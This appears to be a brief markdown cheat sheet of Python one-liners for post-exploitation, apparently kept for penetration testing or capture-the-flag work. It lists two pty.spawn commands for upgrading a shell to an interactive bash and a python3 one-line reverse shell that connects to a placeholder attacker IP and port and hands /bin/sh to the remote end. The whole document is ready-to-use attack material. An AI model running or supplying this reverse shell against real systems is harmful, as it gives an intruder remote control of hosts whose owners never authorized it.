# python
## python2
### upgrade shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## python3
### upgrade shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
### one line reverse shell
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER-IP",ATTACKER-PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```